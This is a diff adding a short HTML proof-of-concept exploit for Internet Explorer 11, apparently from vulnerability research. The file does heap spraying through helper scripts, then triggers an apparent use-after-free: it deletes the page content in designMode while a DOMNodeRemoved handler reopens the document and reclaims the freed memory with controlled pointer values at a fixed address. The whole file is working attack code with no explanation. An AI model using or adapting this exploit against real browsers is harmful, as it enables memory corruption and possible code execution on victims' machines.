@@ -1,0 +1,38 @@
+<!doctype html>
+<html>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=11"> 
+    <script src="cLFHSpray.js"></script>
+    <script src="cBlockSpray.js"></script>
+    <script>
+      var aauCopiesAndSizes  = [
+          [0x08, 0x80], 
+          [0x08, 0x40], 
+          [0x08, 0x20], 
+          [0x10, 0x80]
+      ];
+      var uBaseAddress = 0x12340000;
+      var aoBlockSprays = new Array(aauCopiesAndSizes.length);
+      for (var i = 0; i < aauCopiesAndSizes.length; i++) {
+        aoBlockSprays[i] = new cBlockSpray(aauCopiesAndSizes[i][0], aauCopiesAndSizes[i][1]);
+        aoBlockSprays[i].setChunkDWord(0x0100, uBaseAddress + 0x0300);
+        aoBlockSprays[i].spray();
+      }
+      document.addEventListener("DOMNodeRemoved", function () {
+        document.open();
+        var oLFHReuse = new cLFHSpray(10, 0x28);
+        oLFHReuse.setDWord(0x10, uBaseAddress + 0x0100);
+        oLFHReuse.setDWord(0x14, uBaseAddress + 0x0200);
+        oLFHReuse.spray();
+      }, true);
+      window.onload = function () {
+        document.designMode="on";
+        document.execCommand("SelectAll");
+        document.execCommand("Delete");
+        document.designMode="off";
+      };
+    </script>
+  </head>
+  <body>
+  </body>
+</html>
